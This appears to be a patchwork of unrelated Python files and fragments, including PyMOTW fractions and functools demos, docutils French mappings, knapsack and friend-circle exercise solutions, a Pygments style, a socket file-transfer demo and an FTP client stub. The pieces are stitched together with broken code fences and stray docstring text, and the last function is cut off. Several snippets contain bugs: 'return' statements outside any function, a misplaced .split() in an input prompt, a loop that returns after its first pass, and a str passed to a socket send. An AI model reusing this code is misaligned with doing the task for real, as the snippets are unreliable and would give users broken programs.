    def test_roundtrip(self):
        s = self.mod.writes(nb0)
        self.assertNBEquals(self.mod.reads(s), nb0)

    def test_write_file(self):
        with open_utf8(pjoin(self.wd, "nb0.%s" % self.ext), "w") as f:
            self.mod.write(nb0, f)

    def test_read_file(self):
        with open_utf8(pjoin(self.wd, "nb0.%s" % self.ext), "w") as f:
            self.mod.write(nb0, f)

        with open_utf8(pjoin(self.wd, "nb0.%s" % self.ext), "r") as f:
            nb = self.mod.read(f)

from django import forms
from .models import Measurement


class MeasurementModelForm(forms.ModelForm):
    class Meta:
        model = Measurement
        fields = ("destination",)

# $Id: fr.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Stefane Fermigier <sf@fermigier.com>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
French-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    u"author": u"Auteur",
    u"authors": u"Auteurs",
    u"organization": u"Organisation",
    u"address": u"Adresse",
    u"contact": u"Contact",
    u"version": u"Version",
    u"revision": u"R\u00e9vision",
    u"status": u"Statut",
    u"date": u"Date",
    u"copyright": u"Copyright",
    u"dedication": u"D\u00e9dicace",
    u"abstract": u"R\u00e9sum\u00e9",
    u"attention": u"Attention!",
    u"caution": u"Avertissement!",
    u"danger": u"!DANGER!",
    u"error": u"Erreur",
    u"hint": u"Indication",
    u"important": u"Important",
    u"note": u"Note",
    u"tip": u"Astuce",
    u"warning": u"Avis",
    u"contents": u"Sommaire",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    u"auteur": u"author",
    u"auteurs": u"authors",
    u"organisation": u"organization",
    u"adresse": u"address",
    u"contact": u"contact",
    u"version": u"version",
    u"r\u00e9vision": u"revision",
    u"statut": u"status",
    u"date": u"date",
    u"copyright": u"copyright",
    u"d\u00e9dicace": u"dedication",
    u"r\u00e9sum\u00e9": u"abstract",
}```


```pyFrench (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

# def fractionComparison(a, b):
#     d = a[0] / a[1]
#     f = b[0] / b[1]
#     if d < f:
#         return "<"
#     elif d > f:
#         return ">"
#     else:
#         return "="

(a, b), (c, d) = eval(dir()[0])
r = (a * d) / (b * c)
return "<" if r < 1 else ">" if r > 1 else "="

# 72 chars

# def fractionReducing(f):
#     return [i / math.gcd(f[0], f[1]) for i in f]

# fractionReducing = lambda f: [i / math.gcd(f[0], f[1]) for i in f]

f, = eval(dir()[0])
return [i / math.gcd(f[0], f[1]) for i in f]

from bisect import bisect
from itertools import accumulate


def fracKnapsack(vl, wt, W, n):
    """
    >>> fracKnapsack([60, 100, 120], [10, 20, 30], 50, 3)
    240.0
    """

    r = list(sorted(zip(vl, wt), key=lambda x: x[0] / x[1], reverse=True))
    vl, wt = [i[0] for i in r], [i[1] for i in r]
    acc = list(accumulate(wt))
    k = bisect(acc, W)
    return (
        0
        if k == 0
        else sum(vl[:k]) + (W - acc[k - 1]) * (vl[k]) / (wt[k])
        if k != n
        else sum(vl[:k])
    )


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# https://en.wikipedia.org/wiki/Continuous_knapsack_problem
# https://www.guru99.com/fractional-knapsack-problem-greedy.html
# https://medium.com/walkinthecode/greedy-algorithm-fractional-knapsack-problem-9aba1daecc93

from __future__ import annotations


def fractional_knapsack(
    value: list[int], weight: list[int], capacity: int
) -> tuple[int, list[int]]:
    """
    >>> value = [1, 3, 5, 7, 9]
    >>> weight = [0.9, 0.7, 0.5, 0.3, 0.1]
    >>> fractional_knapsack(value, weight, 5)
    (25, [1, 1, 1, 1, 1])
    >>> fractional_knapsack(value, weight, 15)
    (25, [1, 1, 1, 1, 1])
    >>> fractional_knapsack(value, weight, 25)
    (25, [1, 1, 1, 1, 1])
    >>> fractional_knapsack(value, weight, 26)
    (25, [1, 1, 1, 1, 1])
    >>> fractional_knapsack(value, weight, -1)
    (-90.0, [0, 0, 0, 0, -10.0])
    >>> fractional_knapsack([1, 3, 5, 7], weight, 30)
    (16, [1, 1, 1, 1])
    >>> fractional_knapsack(value, [0.9, 0.7, 0.5, 0.3, 0.1], 30)
    (25, [1, 1, 1, 1, 1])
    >>> fractional_knapsack([], [], 30)
    (0, [])
    """
    index = list(range(len(value)))
    ratio = [v / w for v, w in zip(value, weight)]
    index.sort(key=lambda i: ratio[i], reverse=True)

    max_value = 0
    fractions = [0] * len(value)
    for i in index:
        if weight[i] <= capacity:
            fractions[i] = 1
            max_value += value[i]
            capacity -= weight[i]
        else:
            fractions[i] = capacity / weight[i]
            max_value += value[i] * capacity / weight[i]
            break

    return max_value, fractions


if __name__ == "__main__":
    n = int(input("Enter number of items: "))
    value = input(f"Enter the values of the {n} item(s) in order: ").split()
    value = [int(v) for v in value]
    weight = input(f"Enter the positive weights of the {n} item(s) in order: ".split())
    weight = [int(w) for w in weight]
    capacity = int(input("Enter maximum weight: "))

    max_value, fractions = fractional_knapsack(value, weight, capacity)
    print("The maximum value of items that can be carried:", max_value)
    print("The fractions in which the items should be taken:", fractions)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import fractions

f1 = fractions.Fraction(1, 2)
f2 = fractions.Fraction(3, 4)

print("{} + {} = {}".format(f1, f2, f1 + f2))
print("{} - {} = {}".format(f1, f2, f1 - f2))
print("{} * {} = {}".format(f1, f2, f1 * f2))
print("{} / {} = {}".format(f1, f2, f1 / f2))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import fractions

for n, d in [(1, 2), (2, 4), (3, 6)]:
    f = fractions.Fraction(n, d)
    print("{}/{} = {}".format(n, d, f))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import fractions

for s in ["1/2", "2/4", "3/6"]:
    f = fractions.Fraction(s)
    print("{} = {}".format(s, f))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import fractions

for s in ["0.5", "1.5", "2.0", "5e-1"]:
    f = fractions.Fraction(s)
    print("{0:>4} = {1}".format(s, f))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal
import fractions

values = [
    decimal.Decimal("0.1"),
    decimal.Decimal("0.5"),
    decimal.Decimal("1.5"),
    decimal.Decimal("2.0"),
]

for v in values:
    print("{} = {}".format(v, fractions.Fraction(v)))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import fractions

for v in [0.1, 0.5, 1.5, 2.0]:
    print("{} = {}".format(v, fractions.Fraction(v)))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import fractions
import math

print("PI       =", math.pi)

f_pi = fractions.Fraction(str(math.pi))
print("No limit =", f_pi)

for i in [1, 6, 11, 60, 70, 90, 100]:
    limited = f_pi.limit_denominator(i)
    print("{0:8} = {1}".format(i, limited))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pyppeteer.frame_manager import Frame
from pyppeteer.page import Page


async def attachFrame(page: Page, frameId: str, url: str) -> None:
    func = """
        (frameId, url) => {
            const frame = document.createElement('iframe');
            frame.src = url;
            frame.id = frameId;
            document.body.appendChild(frame);
            return new Promise(x => frame.onload = x);
        }
    """
    await page.evaluate(func, frameId, url)


async def detachFrame(page: Page, frameId: str) -> None:
    func = """
        (frameId) => {
            const frame = document.getElementById(frameId);
            frame.remove();
        }
    """
    await page.evaluate(func, frameId)


async def navigateFrame(page: Page, frameId: str, url: str) -> None:
    func = """
        (frameId, url) => {
            const frame = document.getElementById(frameId);
            frame.src = url;
            return new Promise(x => frame.onload = x);
        }
    """
    await page.evaluate(func, frameId, url)


def dumpFrames(frame: Frame, indentation: str = "") -> str:
    results = []
    results.append(indentation + frame.url)
    for child in frame.childFrames:
        results.append(dumpFrames(child, "    " + indentation))
    return "\n".join(results)
````

```pyProvides a function to report all internal modules for using freezing
tools."""
import types
from typing import Iterator
from typing import List
from typing import Union


def freeze_includes() -> List[str]:
    """Return a list of module names used by pytest that should be
    included by cx_freeze."""
    import py
    import _pytest

    result = list(_iter_all_modules(py))
    result += list(_iter_all_modules(_pytest))
    return result


def _iter_all_modules(
    package: Union[str, types.ModuleType], prefix: str = ""
) -> Iterator[str]:
    """Iterate over the names of all modules that can be found in the given
    package, recursively.

        >>> import _pytest
        >>> list(_iter_all_modules(_pytest))
        ['_pytest._argcomplete', '_pytest._code.code', ...]
    """
    import os
    import pkgutil

    if isinstance(package, str):
        path = package
    else:
        # Type ignored because typeshed doesn't define ModuleType.__path__
        # (only defined on packages).
        package_path = package.__path__  # type: ignore[attr-defined]
        path, prefix = package_path[0], package.__name__ + "."
    for _, name, is_package in pkgutil.iter_modules([path]):
        if is_package:
            for m in _iter_all_modules(os.path.join(path, name), prefix=name + "."):
                yield prefix + m
        else:
            yield prefix + name
```

````py
Given a string, sort it in decreasing order based on the frequency of characters.

Example 1:

```python
Input:
"free"

Output:
"eefr"

Explanation:
'e' appears twice while 'f' and 'r' appear once.
So 'e' must appear before 'f' and 'r'. Therefore, "eerf" is also a valid answer.
````

Example 2:

```python
Input:
"dddbbb"

Output:
"dddbbb"

Explanation:
Both 'd' and 'b' appear three times, so "bbbddd" is also a valid answer.
Note that "dbdbdb" is incorrect, as the same characters must be together.
```

Example 3:

```python
Input:
"Bbcc"

Output:
"ccBb"

Explanation:
"ccbB" is also a valid answer, but "Bbcc" is incorrect.
Note that 'B' and 'b' are treated as two different characters.
```

```py

# Returns count of character in the string


def frequency_sort(s):
    """
    Inputs:
    s -> str

    Output:
    str

     """
    # Your code here
    freq_dict = {}
    for ch in s:
        if ch in freq_dict:
            freq_dict[ch] += 1
        else:
            freq_dict[ch] = 1
    items = sorted(freq_dict.items(), key=lambda kv: kv[1], reverse=True)
    string = ""
    for item in items:
        if item[1] != 0:
            string = string + item[0] * item[1]
    return string


print(frequency_sort("dddbbb"))
print(frequency_sort("Bbcc"))
print(frequency_sort("free"))

import numpy as np


# Recursively finds all students in a single friend circle
def DFS(friendships, n, visited, v):
    for x in range(n):
        # A student is in the friend circle if he/she is friendships with the student represented by
        # studentIndex and if he/she is not already in a friend circle
        if friendships[v, x] and visited[x] == 0:
            if x != v:
                visited[x] = 1
                DFS(friendships, n, visited, x)


n = 4


def csFriendCircles(friendships):

    numCircles = 0  # Number of friend circles

    # Keep track of whether a student is already in a friend circle
    visited = np.zeros((n))

    # Start with the first student and recursively find all other students in his/her
    # friend circle. Then, do the same thing for the next student that is not already
    # in a friend circle. Repeat until all students are in a friend circle.
    for i in range(n):
        if visited[i] == 0:
            visited[i] = 1
            # Recursive step to find all friendships
            DFS(friendships, n, visited, i)
            numCircles = numCircles + 1
            return numCircles

# There are N students in a baking class together. Some of them are friends, while some are not friends. The students' friendship can be considered transitive. This means that if Ami is a direct friend of Bill, and Bill is a direct friend of Casey, Ami is an indirect friend of Casey. A friend circle is a group of students who are either direct or indirect friends of some level. That is, the friend circle consists of a person, their friends, their friends-of-friends, their friends-of-friends-of-friends, and so on.

# Given a N*N matrix M representing the friend relationships between students in the class. If M[i][j] = 1, then the ith and jth students are direct friends with each other, otherwise not.

# You need to write a function that can output the total number of friend circles among all the students.

# Example 1:

# Input:
# [[1,1,0],
#  [1,1,0],
#  [0,0,1]]
# Output: 2
# Explanation: The 0th and 1st students are direct friends, so they are in a friend circle.
# The 2nd student himself is in a friend circle. So return 2.
# Example 2:

# Input:
# [[1,1,0],
#  [1,1,1],
#  [0,1,1]]
# Output: 1
# Explanation: The 0th and 1st students are direct friends, the 1st and 2nd students are direct friends,
# so the 0th and 2nd students are indirect friends. All of them are in the same friend circle, so return 1.
# [execution time limit] 4 seconds (py3)

# [input] array.array.integer friendships

# [output] integer


def dfs(row, friends, visited_arr):
    visited_arr.add(row)
    for neighbor in range(len(friends[row])):
        if friends[row][neighbor] == 1 and neighbor not in visited_arr:
            dfs(neighbor, friends, visited_arr)
    return visited_arr


def csFriendCircles(friendships):
    count = 0
    visited = set()
    if friendships is None or len(friendships) == 0:
        return 0

    for row in range(len(friendships)):
        if friendships[row][row] == 1 and row not in visited:
            count += 1
            visited = dfs(row, friendships, visited)

    return count

# Recursive Prorgam to create a Linked List from a sequence and
# print a string representation of it.


class Node:
    def __init__(self, data=None):
        self.data = data
        self.next = None

    def __repr__(self):
        """Returns a visual representation of the node and all its following nodes."""
        string_rep = ""
        temp = self
        while temp:
            string_rep += f"<{temp.data}> ---> "
            temp = temp.next
        string_rep += "<END>"
        return string_rep


def make_linked_list(elements_list):
    """Creates a Linked List from the elements of the given sequence
    (list/tuple) and returns the head of the Linked List."""

    # if elements_list is empty
    if not elements_list:
        raise Exception("The Elements List is empty")

    # Set first element as Head
    head = Node(elements_list[0])
    current = head
    # Loop through elements from position 1
    for data in elements_list[1:]:
        current.next = Node(data)
        current = current.next
    return head


list_data = [1, 3, 5, 32, 44, 12, 43]
print(f"List: {list_data}")
print("Creating Linked List from List.")
linked_list = make_linked_list(list_data)
print("Linked List:")
print(linked_list)
```

````py
    pygments.styles.fruity
    ~~~~~~~~~~~~~~~~~~~~~~

    pygments version of my "fruity" vim theme.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import (
    Token,
    Comment,
    Name,
    Keyword,
    Generic,
    Number,
    String,
    Whitespace,
)


class FruityStyle(Style):
    """
    Pygments version of the "native" vim theme.
    """

    background_color = "#111111"
    highlight_color = "#333333"

    styles = {
        Whitespace: "#888888",
        Token: "#ffffff",
        Generic.Output: "#444444 bg:#222222",
        Keyword: "#fb660a bold",
        Keyword.Pseudo: "nobold",
        Number: "#0086f7 bold",
        Name.Tag: "#fb660a bold",
        Name.Variable: "#fb660a",
        Comment: "#008800 bg:#0f140f italic",
        Name.Attribute: "#ff0086 bold",
        String: "#0086d2",
        Name.Function: "#ff0086 bold",
        Generic.Heading: "#ffffff bold",
        Keyword.Type: "#cdcaa9 bold",
        Generic.Subheading: "#ffffff bold",
        Name.Constant: "#0086d2",
        Comment.Preproc: "#ff0007 bold",
    }

# server

import socket  # Import socket module

port = 60000  # Reserve a port for your service.
s = socket.socket()  # Create a socket object
host = socket.gethostname()  # Get local machine name
s.bind((host, port))  # Bind to the port
s.listen(5)  # Now wait for client connection.

print("Server listening....")

while True:
    conn, addr = s.accept()  # Establish connection with client.
    print("Got connection from", addr)
    data = conn.recv(1024)
    print("Server received", repr(data))

    filename = "mytext.txt"
    f = open(filename, "rb")
    in_data = f.read(1024)
    while in_data:
        conn.send(in_data)
        print("Sent ", repr(in_data))
        in_data = f.read(1024)
    f.close()

    print("Done sending")
    conn.send("Thank you for connecting")
    conn.close()


# client side server

import socket  # Import socket module

s = socket.socket()  # Create a socket object
host = socket.gethostname()  # Get local machine name
port = 60000  # Reserve a port for your service.

s.connect((host, port))
s.send("Hello server!")

with open("received_file", "wb") as f:
    print("file opened")
    while True:
        print("receiving data...")
        data = s.recv(1024)
        print("data=%s", (data))
        if not data:
            break
        # write data to a file
        f.write(data)

f.close()
print("Successfully get the file")
s.close()
print("connection closed")
````

````py
 File transfer protocol used to send and receive files using FTP server.
 Use credentials to provide access to the FTP client

 Note: Do not use root username & password for security reasons
   Create a seperate user and provide access to a home directory of the user
   Use login id and password of the user created
   cwd here stands for current working directory```


```py

from ftplib import FTP

ftp = FTP("xxx.xxx.x.x")  # Enter the ip address or the domain name here
ftp.login(user="username", passwd="password")
ftp.cwd("/Enter the directory here/")
````

````py
 The file which will be received via the FTP server
 Enter the location of the file where the file is received```


```py


def ReceiveFile():
    FileName = "example.txt" """ Enter the location of the file """
    LocalFile = open(FileName, "wb")
    ftp.retrbinary("RETR " + FileName, LocalFile.write, 1024)
    ftp.quit()
    LocalFile.close()

````

````py
 The file which will be sent via the FTP server
 The file send will be send to the current working directory```


```py


def SendFile():
    FileName = "example.txt" """ Enter the name of the file """
    ftp.storbinary("STOR " + FileName, open(FileName, "rb"))
    ftp.quit()
````

````py
fujitsu

Supports Fujitsu compiler function.
This compiler is developed by Fujitsu and is used in A64FX on Fugaku.```


```py
from numpy.distutils.fcompiler import FCompiler

compilers = ["FujitsuFCompiler"]


class FujitsuFCompiler(FCompiler):
    compiler_type = "fujitsu"
    description = "Fujitsu Fortran Compiler"

    possible_executables = ["frt"]
    version_pattern = r"frt \(FRT\) (?P<version>[a-z\d.]+)"
    # $ frt --version
    # frt (FRT) x.x.x yyyymmdd

    executables = {
        "version_cmd": ["<F77>", "--version"],
        "compiler_f77": ["frt", "-Fixed"],
        "compiler_fix": ["frt", "-Fixed"],
        "compiler_f90": ["frt"],
        "linker_so": ["frt", "-shared"],
        "archiver": ["ar", "-cr"],
        "ranlib": ["ranlib"],
    }
    pic_flags = ["-KPIC"]
    module_dir_switch = "-M"
    module_include_switch = "-I"

    def get_flags_opt(self):
        return ["-O3"]

    def get_flags_debug(self):
        return ["-g"]

    def runtime_library_dir_option(self, dir):
        return f"-Wl,-rpath={dir}"

    def get_libraries(self):
        return ["fj90f", "fj90i", "fjsrcinfo"]


if __name__ == "__main__":
    from distutils import log
    from numpy.distutils import customized_fcompiler

    log.set_verbosity(2)
    print(customized_fcompiler("fujitsu").get_version())

# Write a function is_even that will return true if the passed in number is even.
def is_even(num):
    if int(num) % 2 == 0:
        return True
    else:
        return False


# Read a number from the keyboard
num = input("Enter a number: ")

# Print out "Even!" if the number is even. Otherwise print "Odd"
even = is_even(num)
if even == True:
    print("Even!")
else:
    print("Odd!")
````

````py
Functions allow us to consolidate simple / complex code into a single
block that can be invoked with specific parameters. This module defines
a simple function and a composite function that uses the simple function
in an interesting way.```


```py


def add(x, y):
    """Add two objects together to produce a new object.

    Two differences between `add` and `main` are that:

    - It accepts input parameters
    - It returns a value
    """
    return x + y


def sum_until(fn, n):
    """Sum function results from 0 until n - 1.

    This expects a function to be provided as its first input and an integer
    as its second input. Like `add`, `sum_until` returns a value.

    The fact that a function can be passed into `sum_until` highlights a core
    concept that was mentioned before: everything in Python is an object, and
    that includes this docstring!
    """
    total = 0
    for i in range(n):
        total += fn(i)
    return total


def main():
    # The `add` function can be used for numbers as expected
    add_result_int = add(1, 2)
    assert add_result_int == 3

    # The `add` function can be used for strings as well
    add_result_string = add("hello", " world")
    assert add_result_string == "hello world"

    # Run the input function multiple times. Notice that we make use of
    # `lambda` to create an anonymous function (i.e. a function without
    # a name) that accepts one input and does something with it. Anonymous
    # functions are powerful because they allow one to write functions
    # inline, unlike `add` and `sum_until`
    run_results = sum_until(lambda i: i * 100, 5)
    assert run_results == 1000, run_results

    # We can see the `sum_until` docstring by accessing the `__doc__` magic
    # attribute! Remember this - everything in Python is an object
    assert "includes this docstring!" in sum_until.__doc__


if __name__ == "__main__":
    main()
````

````py
    pygments.lexers.functional
    ~~~~~~~~~~~~~~~~~~~~~~~~~~

    Just export lexer classes previously contained in this module.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexers.lisp import (
    SchemeLexer,
    CommonLispLexer,
    RacketLexer,
    NewLispLexer,
    ShenLexer,
)
from pygments.lexers.haskell import HaskellLexer, LiterateHaskellLexer, KokaLexer
from pygments.lexers.theorem import CoqLexer
from pygments.lexers.erlang import (
    ErlangLexer,
    ErlangShellLexer,
    ElixirConsoleLexer,
    ElixirLexer,
)
from pygments.lexers.ml import SMLLexer, OcamlLexer, OpaLexer

__all__ = []

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import configparser
from os.path import basename, exists, join


def parse_python_version(ver_str):
    return tuple(int(digit) for digit in ver_str.split("."))


class NoFileError(Exception):
    pass


class FunctionalTestFile:
    """A single functional test case file with options."""

    _CONVERTERS = {
        "min_pyver": parse_python_version,
        "max_pyver": parse_python_version,
        "requires": lambda s: s.split(","),
    }

    def __init__(self, directory, filename):
        self._directory = directory
        self.base = filename.replace(".py", "")
        self.options = {
            "min_pyver": (2, 5),
            "max_pyver": (4, 0),
            "requires": [],
            "except_implementations": [],
            "exclude_platforms": [],
        }
        self._parse_options()

    def __repr__(self):
        return f"FunctionalTest:{self.base}"

    def _parse_options(self):
        cp = configparser.ConfigParser()
        cp.add_section("testoptions")
        try:
            cp.read(self.option_file)
        except NoFileError:
            pass

        for name, value in cp.items("testoptions"):
            conv = self._CONVERTERS.get(name, lambda v: v)
            self.options[name] = conv(value)

    @property
    def option_file(self):
        return self._file_type(".rc")

    @property
    def module(self):
        package = basename(self._directory)
        return ".".join([package, self.base])

    @property
    def expected_output(self):
        return self._file_type(".txt", check_exists=False)

    @property
    def source(self):
        return self._file_type(".py")

    def _file_type(self, ext, check_exists=True):
        name = join(self._directory, self.base + ext)
        if not check_exists or exists(name):
            return name
        raise NoFileError(f"Cannot find '{name}'.")

x = 2  # SAVE 2 R0


y = 4  # SAVE 4 R1


add(x, y)  # CALL 11
print("R0")  # PRINT_REG R0

# halt
def add(a, b):
    # ADD R0 R1
    return a + b  # RET


# CALL reg
# RET
# store our variables on the stack
# store our variables in registers R0 R1

# return value can be stored in a register R0

```









---


```py


# end_pymotw_header
import functools


class MyClass:
    "Demonstration class for functools"

    def __call__(self, e, f=6):
        "Docstring for MyClass.__call__"
        print("  called object with:", (self, e, f))


def show_details(name, f):
    "Show details of a callable object."
    print("{}:".format(name))
    print("  object:", f)
    print("  __name__:", end=" ")
    try:
        print(f.__name__)
    except AttributeError:
        print("(no __name__)")
    print("  __doc__", repr(f.__doc__))
    return


o = MyClass()

show_details("instance", o)
o("e goes here")
print()

p = functools.partial(o, e="default for e", f=8)
functools.update_wrapper(p, o)
show_details("instance wrapper", p)
p()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFill in missing rich comparison methods.```


```py

# end_pymotw_header
import functools


class MyObject:
    def __init__(self, val):
        self.val = val

    def __str__(self):
        return "MyObject({})".format(self.val)


def compare_obj(a, b):
    """Old-style comparison function.
    """
    print("comparing {} and {}".format(a, b))
    if a.val < b.val:
        return -1
    elif a.val > b.val:
        return 1
    return 0


# Make a key function using cmp_to_key()
get_key = functools.cmp_to_key(compare_obj)


def get_key_wrapper(o):
    "Wrapper function for get_key to allow for print statements."
    new_key = get_key(o)
    print("key_wrapper({}) -> {!r}".format(o, new_key))
    return new_key


objs = [MyObject(x) for x in range(5, 0, -1)]

for o in sorted(objs, key=get_key_wrapper):
    print(o)

#!/usr/bin/env python3
# encoding: utf-8```


```pyLeast-recently-used cache```


```py

# end_pymotw_header
import functools


@functools.lru_cache()
def expensive(a, b):
    print("expensive({}, {})".format(a, b))
    return a * b


MAX = 2

print("First set of calls:")
for i in range(MAX):
    for j in range(MAX):
        expensive(i, j)
print(expensive.cache_info())

print("\nSecond set of calls:")
for i in range(MAX + 1):
    for j in range(MAX + 1):
        expensive(i, j)
print(expensive.cache_info())

print("\nClearing cache:")
expensive.cache_clear()
print(expensive.cache_info())

print("\nThird set of calls:")
for i in range(MAX):
    for j in range(MAX):
        expensive(i, j)
print(expensive.cache_info())

#!/usr/bin/env python3
# encoding: utf-8```


```pyLeast-recently-used cache```


```py

# end_pymotw_header
import functools


@functools.lru_cache(maxsize=2)
def expensive(a, b):
    print("called expensive({}, {})".format(a, b))
    return a * b


def make_call(a, b):
    print("({}, {})".format(a, b), end=" ")
    pre_hits = expensive.cache_info().hits
    expensive(a, b)
    post_hits = expensive.cache_info().hits
    if post_hits > pre_hits:
        print("cache hit")


make_call(1, 2)

try:
    make_call([1], 2)
except TypeError as err:
    print("ERROR: {}".format(err))

try:
    make_call(1, {"2": "two"})
except TypeError as err:
    print("ERROR: {}".format(err))

#!/usr/bin/env python3
# encoding: utf-8```


```pyLeast-recently-used cache```


```py

# end_pymotw_header
import functools


@functools.lru_cache(maxsize=2)
def expensive(a, b):
    print("called expensive({}, {})".format(a, b))
    return a * b


def make_call(a, b):
    print("({}, {})".format(a, b), end=" ")
    pre_hits = expensive.cache_info().hits
    expensive(a, b)
    post_hits = expensive.cache_info().hits
    if post_hits > pre_hits:
        print("cache hit")


print("Establish the cache")
make_call(1, 2)
make_call(2, 3)

print("\nUse cached items")
make_call(1, 2)
make_call(2, 3)

print("\nCompute a new value, triggering cache expiration")
make_call(3, 4)

print("\nCache still contains one old item")
make_call(2, 3)

print("\nOldest item needs to be recomputed")
make_call(1, 2)

```









---


```py


# end_pymotw_header
import functools


def myfunc(a, b=2):
    "Docstring for myfunc()."
    print("  called myfunc with:", (a, b))


def show_details(name, f, is_partial=False):
    "Show details of a callable object."
    print("{}:".format(name))
    print("  object:", f)
    if not is_partial:
        print("  __name__:", f.__name__)
    if is_partial:
        print("  func:", f.func)
        print("  args:", f.args)
        print("  keywords:", f.keywords)
    return


show_details("myfunc", myfunc)
myfunc("a", 3)
print()

# Set a different default value for 'b', but require
# the caller to provide 'a'.
p1 = functools.partial(myfunc, b=4)
show_details("partial with named default", p1, True)
p1("passing a")
p1("override b", b=5)
print()

# Set default values for both 'a' and 'b'.
p2 = functools.partial(myfunc, "default a", b=99)
show_details("partial with defaults", p2, True)
p2()
p2(b="override b")
print()

print("Insufficient arguments:")
p1()

```









---


```py


# end_pymotw_header
import functools


def standalone(self, a=1, b=2):
    "Standalone function"
    print("  called standalone with:", (self, a, b))
    if self is not None:
        print("  self.attr =", self.attr)


class MyClass:
    "Demonstration class for functools"

    def __init__(self):
        self.attr = "instance attribute"

    method1 = functools.partialmethod(standalone)
    method2 = functools.partial(standalone)


o = MyClass()

print("standalone")
standalone(None)
print()

print("method1 as partialmethod")
o.method1()
print()

print("method2 as partial")
try:
    o.method2()
except TypeError as err:
    print("ERROR: {}".format(err))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import functools


def do_reduce(a, b):
    print("do_reduce({}, {})".format(a, b))
    return a + b


data = range(1, 5)
print(data)
result = functools.reduce(do_reduce, data)
print("result: {}".format(result))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import functools


def do_reduce(a, b):
    print("do_reduce({}, {})".format(a, b))
    return a + b


data = range(1, 5)
print(data)
result = functools.reduce(do_reduce, data, 99)
print("result: {}".format(result))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import functools


def do_reduce(a, b):
    print("do_reduce({}, {})".format(a, b))
    return a + b


print("Single item in sequence:", functools.reduce(do_reduce, [1]))

print("Single item in sequence with initializer:", functools.reduce(do_reduce, [1], 99))

print("Empty sequence with initializer:", functools.reduce(do_reduce, [], 99))

try:
    print("Empty sequence:", functools.reduce(do_reduce, []))
except TypeError as err:
    print("ERROR: {}".format(err))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import functools


@functools.singledispatch
def myfunc(arg):
    print("default myfunc({!r})".format(arg))


@myfunc.register(int)
def myfunc_int(arg):
    print("myfunc_int({})".format(arg))


@myfunc.register(list)
def myfunc_list(arg):
    print("myfunc_list()")
    for item in arg:
        print("  {}".format(item))


myfunc("string argument")
myfunc(1)
myfunc(2.3)
myfunc(["a", "b", "c"])

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import functools


class A:
    pass


class B(A):
    pass


class C(A):
    pass


class D(B):
    pass


class E(C, D):
    pass


@functools.singledispatch
def myfunc(arg):
    print("default myfunc({})".format(arg.__class__.__name__))


@myfunc.register(A)
def myfunc_A(arg):
    print("myfunc_A({})".format(arg.__class__.__name__))


@myfunc.register(B)
def myfunc_B(arg):
    print("myfunc_B({})".format(arg.__class__.__name__))


@myfunc.register(C)
def myfunc_C(arg):
    print("myfunc_C({})".format(arg.__class__.__name__))


myfunc(A())
myfunc(B())
myfunc(C())
myfunc(D())
myfunc(E())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFill in missing rich comparison methods.```


```py

# end_pymotw_header
import functools
import inspect
from pprint import pprint


@functools.total_ordering
class MyObject:
    def __init__(self, val):
        self.val = val

    def __eq__(self, other):
        print("  testing __eq__({}, {})".format(self.val, other.val))
        return self.val == other.val

    def __gt__(self, other):
        print("  testing __gt__({}, {})".format(self.val, other.val))
        return self.val > other.val


print("Methods:\n")
pprint(inspect.getmembers(MyObject, inspect.isfunction))

a = MyObject(1)
b = MyObject(2)

print("\nComparisons:")
for expr in ["a < b", "a <= b", "a == b", "a >= b", "a > b"]:
    print("\n{:<6}:".format(expr))
    result = eval(expr)
    print("  result of {}: {}".format(expr, result))

```









---


```py


# end_pymotw_header
import functools


def myfunc(a, b=2):
    "Docstring for myfunc()."
    print("  called myfunc with:", (a, b))


def show_details(name, f):
    "Show details of a callable object."
    print("{}:".format(name))
    print("  object:", f)
    print("  __name__:", end=" ")
    try:
        print(f.__name__)
    except AttributeError:
        print("(no __name__)")
    print("  __doc__", repr(f.__doc__))
    print()


show_details("myfunc", myfunc)

p1 = functools.partial(myfunc, b=4)
show_details("raw wrapper", p1)

print("Updating wrapper:")
print("  assign:", functools.WRAPPER_ASSIGNMENTS)
print("  update:", functools.WRAPPER_UPDATES)
print()

functools.update_wrapper(p1, myfunc)
show_details("updated wrapper", p1)

```









---


```py


# end_pymotw_header
import functools


def show_details(name, f):
    "Show details of a callable object."
    print("{}:".format(name))
    print("  object:", f)
    print("  __name__:", end=" ")
    try:
        print(f.__name__)
    except AttributeError:
        print("(no __name__)")
    print("  __doc__", repr(f.__doc__))
    print()


def simple_decorator(f):
